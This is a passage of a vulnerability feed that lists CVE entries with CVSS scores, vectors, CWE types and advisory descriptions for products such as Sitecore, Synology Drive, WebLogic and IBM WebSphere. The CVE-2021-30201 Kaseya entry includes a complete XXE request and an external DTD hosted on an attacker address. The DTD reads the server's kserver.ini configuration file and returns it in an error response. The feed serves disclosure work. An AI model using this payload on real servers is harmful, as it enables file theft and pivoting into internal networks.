| Published | 2025-06-17T18:20:57.441Z |

Sitecore Experience Manager (XM) and Experience Platform (XP) versions 10.1 to 10.1.4 rev. 011974 PRE, all versions of 10.2, 10.3 to 10.3.3 rev. 011967 PRE, and 10.4 to 10.4.1 rev. 011941 PRE contain a hardcoded user account. Unauthenticated and remote attackers can use this account to access administrative API over HTTP.

### CVE-2025-4544

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-121;CWE-119` |
| Published | 2025-05-11T18:31:05.076Z |

A vulnerability was found in D-Link DI-8100 up to 16.07.26A1 and classified as critical. This issue affects some unknown processing of the file /ddos.asp of the component jhttpd. The manipulation of the argument def_max/def_time/def_tcp_max/def_tcp_time/def_udp_max/def_udp_time/def_icmp_max leads to stack-based buffer overflow. The attack may be initiated remotely. The complexity of an attack is rather high. The exploitation is known to be difficult.

### CVE-2024-50631

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2025-03-19T05:50:08.565Z |

Improper neutralization of special elements used in an SQL command ('SQL Injection') vulnerability in the system syncing daemon in Synology Drive Server before 3.0.4-12699, 3.2.1-23280, 3.5.0-26085 and 3.5.1-26102 allows remote attackers to inject SQL commands, limited to write operations, via unspecified vectors.

### CVE-2024-50630

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-306` |
| Published | 2025-03-19T05:50:05.059Z |

Missing authentication for critical function vulnerability in the webapi component in Synology Drive Server before 3.0.4-12699, 3.2.1-23280, 3.5.0-26085 and 3.5.1-26102 allows remote attackers to obtain administrator credentials via unspecified vectors.

### CVE-2025-24799

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2025-03-18T18:27:54.631Z |

GLPI is a free asset and IT management software package. An unauthenticated user can perform a SQL injection through the inventory endpoint. This vulnerability is fixed in 10.0.18.

### CVE-2025-26794

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-89` |
| Published | 2025-02-21T00:00:00.000Z |

Exim 4.98 before 4.98.1, when SQLite hints and ETRN serialization are used, allows remote SQL injection. (Resolving SQL injection requires an update to 4.99.1 in certain non-default rate-limit configurations.)

### CVE-2024-53991

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-200` |
| Published | 2024-12-19T19:11:20.590Z |

Discourse is an open source platform for community discussion. This vulnerability only impacts Discourse instances configured to use `FileStore::LocalStore` which means uploads and backups are stored locally on disk. If an attacker knows the name of the Discourse backup file, the attacker can trick nginx into sending the Discourse backup file with a well crafted request. This issue is patched in the latest stable, beta and tests-passed versions of Discourse. Users are advised to upgrade. Users unable to upgrade can either 1. Download all local backups on to another storage device, disable the `enable_backups` site setting and delete all backups until the site has been upgraded to pull in the fix. Or  2. Change the `backup_location` site setting to `s3` so that backups are stored and downloaded directly from S3.

### CVE-2024-49113

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:U/RL:O/RC:C` |
| Weaknesses | `CWE-125` |
| Published | 2024-12-10T17:49:45.354Z |

Windows Lightweight Directory Access Protocol (LDAP) Denial of Service Vulnerability

### CVE-2020-26073

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/RL:X/RC:X/E:X` |
| Weaknesses | `CWE-35` |
| Published | 2024-11-18T15:57:25.059Z |

A vulnerability in the application data endpoints of Cisco&nbsp;SD-WAN vManage Software could allow an unauthenticated, remote attacker to gain access to sensitive information.
The vulnerability is due to improper validation of directory traversal character sequences within requests to application programmatic interfaces (APIs). An attacker could exploit this vulnerability by sending malicious requests to an API within the affected application. A successful exploit could allow the attacker to conduct directory traversal attacks and gain access to sensitive information including credentials or user tokens.Cisco&nbsp;has released software updates that address this vulnerability. There are no workarounds that address this vulnerability.

### CVE-2024-43989

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N` |
| Weaknesses | `CWE-918` |
| Published | 2024-09-22T23:59:40.916Z |

Server-Side Request Forgery (SSRF) vulnerability in Firsh Justified Image Grid justified-image-grid.This issue affects Justified Image Grid: from n/a through <= 4.6.1.

### CVE-2024-46982

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-639` |
| Published | 2024-09-17T21:55:04.312Z |

Next.js is a React framework for building full-stack web applications. By sending a crafted HTTP request, it is possible to poison the cache of a non-dynamic server-side rendered route in the pages router (this does not affect the app router). When this crafted request is sent it could coerce Next.js to cache a route that is meant to not be cached and send a `Cache-Control: s-maxage=1, stale-while-revalidate` header which some upstream CDNs may cache as well. To be potentially affected all of the following must apply: 1. Next.js between 13.5.1 and 14.2.9, 2. Using pages router, & 3. Using non-dynamic server-side rendered routes e.g. `pages/dashboard.tsx` not `pages/blog/[slug].tsx`. This vulnerability was resolved in Next.js v13.5.7, v14.2.10, and later. We recommend upgrading regardless of whether you can reproduce the issue or not. There are no official or recommended workarounds for this issue, we recommend that users patch to a safe version.

### CVE-2024-38816

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `N/A` |
| Published | 2024-09-13T06:10:06.598Z |

Applications serving static resources through the functional web frameworks WebMvc.fn or WebFlux.fn are vulnerable to path traversal attacks. An attacker can craft malicious HTTP requests and obtain any file on the file system that is also accessible to the process in which the Spring application is running.

Specifically, an application is vulnerable when both of the following are true:

  *  the web application uses RouterFunctions to serve static resources
  *  resource handling is explicitly configured with a FileSystemResource location


However, malicious requests are blocked and rejected when any of the following is true:

  *  the  Spring Security HTTP Firewall https://docs.spring.io/spring-security/reference/servlet/exploits/firewall.html  is in use
  *  the application runs on Tomcat or Jetty

### CVE-2024-20440

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-532` |
| Published | 2024-09-04T16:28:49.040Z |

A vulnerability in Cisco Smart Licensing Utility could allow an unauthenticated, remote attacker to access sensitive information.

This vulnerability is due to excessive verbosity in a debug log file. An attacker could exploit this vulnerability by sending a crafted HTTP request to an affected device. A successful exploit could allow the attacker to obtain log files that contain sensitive data, including credentials that can be used to access the API.

### CVE-2024-45388

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-200` |
| Published | 2024-09-02T16:07:17.599Z |

Hoverfly is a lightweight service virtualization/ API simulation / API mocking tool for developers and testers. The `/api/v2/simulation` POST handler allows users to create new simulation views from the contents of a user-specified file. This feature can be abused by an attacker to read arbitrary files from the Hoverfly server. Note that, although the code prevents absolute paths from being specified, an attacker can escape out of the `hf.Cfg.ResponsesBodyFilesPath` base path by using `../` segments and reach any arbitrary files. This issue was found using the Uncontrolled data used in path expression CodeQL query for python. Users are advised to make sure the final path (`filepath.Join(hf.Cfg.ResponsesBodyFilesPath, filePath)`) is contained within the expected base path (`filepath.Join(hf.Cfg.ResponsesBodyFilesPath, "/")`). This issue is also tracked as GHSL-2023-274.

### CVE-2024-36991

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-35` |
| Published | 2024-07-01T16:31:03.563Z |

In Splunk Enterprise on Windows versions below 9.2.2, 9.1.5, and 9.0.10, an attacker could perform a path traversal on the /modules/messaging/ endpoint in Splunk Enterprise on Windows. This vulnerability should only affect Splunk Enterprise on Windows.

### CVE-2024-26026

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2024-05-08T15:01:28.771Z |

An SQL injection vulnerability exists in the BIG-IP Next Central Manager API (URI).  Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated

### CVE-2024-21793

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2024-05-08T15:01:28.422Z |

An OData injection vulnerability exists in the BIG-IP Next Central Manager API (URI).  Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.

### CVE-2024-29059

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:U/RL:O/RC:C` |
| Weaknesses | `CWE-209` |
| Published | 2024-03-22T23:09:05.745Z |

.NET Framework Information Disclosure Vulnerability

### CVE-2024-0801

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `N/A` |
| Published | 2024-03-13T19:04:47.968Z |

A denial of service vulnerability exists in Arcserve Unified Data Protection 9.2 and 8.1 in ASNative.dll.

### CVE-2024-20931

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `N/A` |
| Published | 2024-02-17T01:50:12.858Z |

Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Core).  Supported versions that are affected are 12.2.1.4.0 and  14.1.1.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via T3, IIOP to compromise Oracle WebLogic Server.  Successful attacks of this vulnerability can result in  unauthorized access to critical data or complete access to all Oracle WebLogic Server accessible data. CVSS 3.1 Base Score 7.5 (Confidentiality impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N).

### CVE-2023-38205

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-284` |
| Published | 2023-09-14T07:40:12.725Z |

Adobe ColdFusion versions 2018u18 (and earlier), 2021u8 (and earlier) and 2023u2 (and earlier) are affected by an Improper Access Control vulnerability that could result in a Security feature bypass. An attacker could leverage this vulnerability to access the administration CFM and CFC endpoints. Exploitation of this issue does not require user interaction.

### CVE-2023-22047

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `N/A` |
| Published | 2023-07-18T20:18:30.693Z |

Vulnerability in the PeopleSoft Enterprise PeopleTools product of Oracle PeopleSoft (component: Portal).  Supported versions that are affected are 8.59 and  8.60. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise PeopleSoft Enterprise PeopleTools.  Successful attacks of this vulnerability can result in  unauthorized access to critical data or complete access to all PeopleSoft Enterprise PeopleTools accessible data. CVSS 3.1 Base Score 7.5 (Confidentiality impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N).

### CVE-2023-36884

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C` |
| Weaknesses | `CWE-362` |
| Published | 2023-07-11T18:14:23.245Z |

Windows Search Remote Code Execution Vulnerability

### CVE-2023-28432

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-200` |
| Published | 2023-03-22T20:16:38.641Z |

Minio is a Multi-Cloud Object Storage framework. In a cluster deployment starting with RELEASE.2019-12-17T23-16-33Z and prior to RELEASE.2023-03-20T20-16-18Z, MinIO returns all environment variables, including `MINIO_SECRET_KEY`
and `MINIO_ROOT_PASSWORD`, resulting in information disclosure. All users of distributed deployment are impacted. All users are advised to upgrade to RELEASE.2023-03-20T20-16-18Z.

### CVE-2023-21839

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `N/A` |
| Published | 2023-01-17T23:35:09.774Z |

Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Core).  Supported versions that are affected are 12.2.1.3.0, 12.2.1.4.0 and  14.1.1.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via T3, IIOP to compromise Oracle WebLogic Server.  Successful attacks of this vulnerability can result in  unauthorized access to critical data or complete access to all Oracle WebLogic Server accessible data. CVSS 3.1 Base Score 7.5 (Confidentiality impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N).

### CVE-2022-22246

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-829` |
| Published | 2022-10-18T02:46:48.799Z |

A PHP Local File Inclusion (LFI) vulnerability in the J-Web component of Juniper Networks Junos OS may allow a low-privileged authenticated attacker to execute an untrusted PHP file. By chaining this vulnerability with other unspecified vulnerabilities, and by circumventing existing attack requirements, successful exploitation could lead to a complete system compromise. This issue affects Juniper Networks Junos OS: all versions prior to 19.1R3-S9; 19.2 versions prior to 19.2R3-S6; 19.3 versions prior to 19.3R3-S6; 19.4 versions prior to 19.4R2-S7, 19.4R3-S8; 20.1 versions prior to 20.1R3-S5; 20.2 versions prior to 20.2R3-S5; 20.3 versions prior to 20.3R3-S5; 20.4 versions prior to 20.4R3-S4; 21.1 versions prior to 21.1R3-S2; 21.2 versions prior to 21.2R3-S1; 21.3 versions prior to 21.3R2-S2, 21.3R3; 21.4 versions prior to 21.4R1-S2, 21.4R2-S1, 21.4R3; 22.1 versions prior to 22.1R1-S1, 22.1R2.

### CVE-2022-21449

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
| Weaknesses | `N/A` |
| Published | 2022-04-19T20:37:39.000Z |

Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 17.0.2 and 18; Oracle GraalVM Enterprise Edition: 21.3.1 and 22.0.0.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 7.5 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N).

### CVE-2021-30201

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `N/A` |
| Published | 2021-07-09T13:25:37.000Z |

The API /vsaWS/KaseyaWS.asmx can be used to submit XML to the system. When this XML is processed (external) entities are insecurely processed and fetched by the system and returned to the attacker. Detailed description Given the following request: ``` POST /vsaWS/KaseyaWS.asmx HTTP/1.1 Content-Type: text/xml;charset=UTF-8 Host: 192.168.1.194:18081 Content-Length: 406 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:kas="KaseyaWS"> <soapenv:Header/> <soapenv:Body> <kas:PrimitiveResetPassword> <!--type: string--> <kas:XmlRequest><![CDATA[<!DOCTYPE data SYSTEM "http://192.168.1.170:8080/oob.dtd"><data>&send;</data>]]> </kas:XmlRequest> </kas:PrimitiveResetPassword> </soapenv:Body> </soapenv:Envelope> ``` And the following XML file hosted at http://192.168.1.170/oob.dtd: ``` <!ENTITY % file SYSTEM "file://c:\\kaseya\\kserver\\kserver.ini"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error; ``` The server will fetch this XML file and process it, it will read the file c:\\kaseya\\kserver\\kserver.ini and returns the content in the server response like below. Response: ``` HTTP/1.1 500 Internal Server Error Cache-Control: private Content-Type: text/xml; charset=utf-8 Date: Fri, 02 Apr 2021 10:07:38 GMT Strict-Transport-Security: max-age=63072000; includeSubDomains Connection: close Content-Length: 2677 <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><soap:Fault><faultcode>soap:Server</faultcode><faultstring>Server was unable to process request. ---&gt; There is an error in XML document (24, -1000).\r\n\r\nSystem.Xml.XmlException: Fragment identifier '######################################################################## # This is the configuration file for the KServer. # Place it in the same directory as the KServer executable # A blank line or new valid section header [] terminates each section. # Comment lines start with ; or # ######################################################################## <snip> ``` Security issues discovered --- * The API insecurely resolves external XML entities * The API has an overly verbose error response Impact --- Using this vulnerability an attacker can read any file on the server the webserver process can read. Additionally, it can be used to perform HTTP(s) requests into the local network and thus use the Kaseya system to pivot into the local network.

### CVE-2021-33742

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C` |
| Weaknesses | `N/A` |
| Published | 2021-06-08T22:46:44.000Z |

Windows MSHTML Platform Remote Code Execution Vulnerability

### CVE-2020-3259

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-200` |
| Published | 2020-05-06T16:41:53.659Z |

A vulnerability in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to retrieve memory contents on an affected device, which could lead to the disclosure of confidential information. The vulnerability is due to a buffer tracking issue when the software parses invalid URLs that are requested from the web services interface. An attacker could exploit this vulnerability by sending a crafted GET request to the web services interface. A successful exploit could allow the attacker to retrieve memory contents, which could lead to the disclosure of confidential information. Note: This vulnerability affects only specific AnyConnect and WebVPN configurations. For more information, see the Vulnerable Products section.

### CVE-2019-9514

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-400` |
| Published | 2019-08-13T00:00:00.000Z |

Some HTTP/2 implementations are vulnerable to a reset flood, potentially leading to a denial of service. The attacker opens a number of streams and sends an invalid request over each stream that should solicit a stream of RST_STREAM frames from the peer. Depending on how the peer queues the RST_STREAM frames, this can consume excess memory, CPU, or both.

### CVE-2019-1653

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-284` |
| Published | 2019-01-24T16:00:00.000Z |

A vulnerability in the web-based management interface of Cisco Small Business RV320 and RV325 Dual Gigabit WAN VPN Routers could allow an unauthenticated, remote attacker to retrieve sensitive information. The vulnerability is due to improper access controls for URLs. An attacker could exploit this vulnerability by connecting to an affected device via HTTP or HTTPS and requesting specific URLs. A successful exploit could allow the attacker to download the router configuration or detailed diagnostic information. Cisco has released firmware updates that address this vulnerability.

### CVE-2026-48505

| 項目 | 値 |
|------|-----|
| CVSS | `7.4` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-362;CWE-841` |
| Published | 2026-06-22T22:16:47.303 |

Filament is a collection of full-stack components for accelerated Laravel development. From 4.0.0 until 4.11.5 and 5.6.5, a flaw in the handling of recovery codes for app-based multi-factor authentication allows the same recovery code to be reused via concurrent submission. This issue does not affect email-based MFA. It also only applies when recovery codes are enabled. If an attacker gains access to both the user's password and their recovery codes, they get two authenticated sessions per recovery code burned instead of one, or more if they batch the parallel submissions wider, materially extending the attacker's window of access compared to what the single-use guarantee implies. This vulnerability is fixed in 4.11.5 and 5.6.5.

### CVE-2026-9006

| 項目 | 値 |
|------|-----|
| CVSS | `7.4` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-918` |
| Published | 2026-06-22T16:16:43.233 |

IBM WebSphere Application Server 9.0, and 8.5 is vulnerable to server-side request forgery (SSRF) with the Ajax Proxy configured. This may allow an attacker to send unauthorized requests from the system, resulting in a security bypass or information disclosure.

### CVE-2026-8646

| 項目 | 値 |
|------|-----|
| CVSS | `7.4` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-444` |
| Published | 2026-06-22T16:16:42.360 |

IBM WebSphere Application Server 9.0 and 8.5 and IBM WebSphere Application Server - Liberty 17.0.0.3 through 26.0.0.6 are vulnerable to HTTP request smuggling. A remote attacker could smuggle a specially crafted request to the application server thereby allowing the attacker to bypass security controls, spoof identity, escalate privilege, and expose sensitive information.

### CVE-2024-20767

| 項目 | 値 |
|------|-----|
| CVSS | `7.4` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-284` |
| Published | 2024-03-18T11:43:28.473Z |

ColdFusion versions 2023.6, 2021.12 and earlier are affected by an Improper Access Control vulnerability that could result in arbitrary file system read. An attacker could leverage this vulnerability to access or modify restricted files. Exploitation of this issue does not require user interaction. Exploitation of this issue requires the admin panel be exposed to the internet.

### CVE-2020-15175

| 項目 | 値 |
|------|-----|
| CVSS | `7.4` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-552` |
| Published | 2020-10-07T18:45:14.000Z |

In GLPI before version 9.5.2, the `​pluginimage.send.php​` endpoint allows a user to specify an image from a plugin. The parameters can be maliciously crafted to instead delete the .htaccess file for the files directory. Any user becomes able to read all the files and folders contained in “/files/”. Some of the sensitive information that is compromised are the user sessions, logs, and more. An attacker would be able to get the Administrators session token and use that to authenticate. The issue is patched in version 9.5.2.

### CVE-2026-41046

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H` |
| Weaknesses | `CWE-23` |
| Published | 2026-06-22T16:16:35.007 |

A path traversal attack when using a "configName" parameter in qSnapper before version 1.3.3 allowed a local attacker to use malicious config files for snapper and so cause a denial of service or potentially escalate privileges to root.

### CVE-2026-10845

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L` |
| Weaknesses | `CWE-287` |
| Published | 2026-06-22T16:16:32.690 |

IBM WebSphere Application Server 8.5 and 9.0 could allow a remote attacker to bypass authentication and gain unauthorized access to JAX-WS applications.

### CVE-2025-36604

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L` |
| Weaknesses | `CWE-78` |
| Published | 2025-08-04T14:00:05.295Z |

Dell Unity, version(s) 5.5 and prior, contain(s) an Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') vulnerability. An unauthenticated attacker with remote access could potentially exploit this vulnerability, leading to arbitrary command execution.

### CVE-2024-53675

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L` |
| Weaknesses | `CWE-91` |
| Published | 2024-11-26T22:01:12.616Z |

An XML external entity injection (XXE) vulnerability in HPE Insight Remote Support may allow remote users to disclose information in certain cases.

### CVE-2024-50340

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L` |
| Weaknesses | `CWE-74` |
| Published | 2024-11-06T21:09:46.750Z |

symfony/runtime is a module for the Symphony PHP framework which enables decoupling PHP applications from global state. When the `register_argv_argc` php directive is set to `on` , and users call any URL with a special crafted query string, they are able to change the environment or debug mode used by the kernel when handling the request. As of versions 5.4.46, 6.4.14, and 7.1.7 the `SymfonyRuntime` now ignores the `argv` values for non-SAPI PHP runtimes. All users are advised to upgrade. There are no known workarounds for this vulnerability.

### CVE-2024-43362

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:N/A:H` |
| Weaknesses | `CWE-79` |
| Published | 2024-10-07T20:34:58.936Z |

Cacti is an open source performance and fault management framework. The `fileurl` parameter is not properly sanitized when saving external links in `links.php` . Morever, the said fileurl is placed in some html code which is passed to the `print` function in `link.php` and `index.php`, finally leading to stored XSS. Users with the privilege to create external links can manipulate the `fileurl` parameter in the http post request while creating external links to perform stored XSS attacks. The vulnerability known as XSS (Cross-Site Scripting) occurs when an application allows untrusted user input to be displayed on a web page without proper validation or escaping. This issue has been addressed in release version 1.2.28. All users are advised to upgrade. There are no known workarounds for this issue.

### CVE-2024-3273

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L` |
| Weaknesses | `CWE-77` |
| Published | 2024-04-04T01:00:06.842Z |

** UNSUPPORTED WHEN ASSIGNED ** A vulnerability, which was classified as critical, was found in D-Link DNS-320L, DNS-325, DNS-327L and DNS-340L up to 20240403. Affected is an unknown function of the file /cgi-bin/nas_sharing.cgi of the component HTTP GET Request Handler. The manipulation of the argument system leads to command injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-259284. NOTE: This vulnerability only affects products that are no longer supported by the maintainer. NOTE: Vendor was contacted early and confirmed immediately that the product is end-of-life. It should be retired and replaced.

### CVE-2024-27199

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L` |
| Weaknesses | `CWE-23` |
| Published | 2024-03-04T17:21:40.081Z |

In JetBrains TeamCity before 2023.11.4 path traversal allowing to perform limited admin actions  was possible

### CVE-2021-33766

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:U/RL:O/RC:C` |
| Weaknesses | `N/A` |
| Published | 2021-07-14T17:53:40.000Z |

Microsoft Exchange Server Information Disclosure Vulnerability

### CVE-2018-12463

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L` |
| Weaknesses | `N/A` |
| Published | 2018-07-12T16:00:00.000Z |

An XML external entity (XXE) vulnerability in Fortify Software Security Center (SSC), version 17.1, 17.2, 18.1 allows remote unauthenticated users to read arbitrary files or conduct server-side request forgery (SSRF) attacks via a crafted DTD in an XML request.

### CVE-2026-56784

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-639` |
| Published | 2026-06-23T13:16:46.980 |

OpenRemote Manager before 1.24.2 contains an insecure direct object reference vulnerability in the removeAlarms() method that allows authenticated users to delete alarms from other tenants by supplying arbitrary alarm IDs. The bulk deletion endpoint fails to validate that targeted alarm IDs belong to the caller's realm, enabling cross-tenant permanent destruction of safety-critical and security alerts.

